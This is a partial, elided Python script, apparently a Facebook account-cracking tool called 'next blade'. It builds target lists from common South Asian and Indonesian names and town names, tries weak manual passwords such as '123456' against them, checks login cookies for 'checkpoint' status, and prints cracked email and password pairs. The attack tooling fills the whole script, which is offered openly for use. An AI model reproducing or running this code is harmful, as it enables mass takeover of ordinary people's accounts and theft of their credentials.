...
author = 'AZAN ALI'
git_hub = 'github.com/MR-AZAN'
faceb0ok = 'AZAN ALI'
version = 'next blade v.1'

'''Open-Source By Mr AZAN <3 '''
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
...
-----------------------------------------------
   {M}•{K}•{H}• {P}WELCOME TO AXB WORLD {H}•{K}•{M}•""")
def logo2():
	return str(f"""
    █████╗ ██╗  ██╗██████╗ 
   ██╔══██╗╚██╗██╔╝██╔══██╗
...
def clon_email():
	rc = random.choice
	rr = random.randint
	bas = ['adi','ali','muhammad','noor','alisha','fatima','haroon','aresha','kashif','zain','mumtaz','aditya','aryyan','khan','hammayoun','david','imtaiz','hamza','farhan','adnan','shazia']
...
def crack_search():
	nama = []
	custom = [" muhammad"," fizan"," hmza"," kashif"," khankhan"," hamza"," aresha"," fatima"," imtaiz"," kashif"," mani"," tahir"," shahid"," aja"," new"," aryyan"," saba"," shazia"," noor"," ayyat"," hassan"," wasi"," ateeq"," subhan"," ahad"," nadia"," shokat"," sultan"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya "]
	...
	print(f' [{hh}<{P}] 1 name setara dengan 10k akun')
	nam = input(f' name : ').split(",")
	for ser in nam:		
...
def manual():
	...
	pwx = []
	print(f"{P} ─────────────────────────────")
	B = input(f' [{hh}>{P}] input PASWORD manual 6 kata\n password  : ').split(',')
	for x in B:
		pwx.append(x)
	print(f"{P} ─────────────────────────────")
...
def gabung():
	...
	A = ["123456"]
	print(f"{P} ─────────────────────────────")
	B = input(f' [{hh}•••{P}] MASUKAN PASSWORD MANUAL 6 WORDS\n password  : ').split(',')
	C = input(f' [{hh}•••{P}] MASUKAN PASSWORD BELAKANG NAME\n password  : ')
	if ',' in str(C):
		...
		try:
			...
			if "checkpoint" in ses.cookies.get_dict():
				...
				if data in resok:pass
					...
					if "coki" in akunok:
						print("\n %sEMAIL & PASDWORD : %s|%s %s• %s "%(H,idf,pw,warna_warni_biasa,tahunng(idf)))
...
def sesi(res):
	...
	form = response.find('form',{'method':'get'})
...
def cek_opsi(idf,pw,ua):
	...
	try:
		...
		form = ress.find('form',{'method':'get'})
...
def language(cookie):
	try:
		...
		for x in data.find_all('form',{'method':'get'}):
